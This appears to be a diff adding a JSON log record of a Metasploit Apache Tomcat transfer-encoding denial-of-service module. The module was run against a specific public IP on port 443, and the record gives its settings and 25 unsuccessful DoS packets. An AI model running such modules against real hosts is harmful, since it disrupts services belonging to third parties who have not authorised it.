@@ -1,0 +1,64 @@
+{"ip":"27.221.59.244:443","protocol":"http","module":"auxiliary/dos/http/apache_tomcat_transfer_encoding","result":"VERBOSE => true
+RPORT => 443
+SSL => false
+SSLVersion => Auto
+SSLVerifyMode => PEER
+ConnectTimeout => 10
+TCP::max_send_size => 0
+TCP::send_delay => 0
+RLIMIT => 25
+RHOSTS => 27.221.59.244
+DisablePayloadHandler => True
+[*] Running module against 27.221.59.244
+[*] 27.221.59.244:443 - Sending DoS packet 1 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 2 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 3 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 4 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 5 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 6 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 7 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 8 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 9 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 10 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 11 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 12 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 13 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 14 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 15 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 16 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 17 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 18 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 19 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 20 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 21 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 22 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 23 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 24 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] 27.221.59.244:443 - Sending DoS packet 25 to 27.221.59.244:443
+[-] 27.221.59.244:443 - DoS packet unsuccessful
+[*] Auxiliary module execution completed
+"}
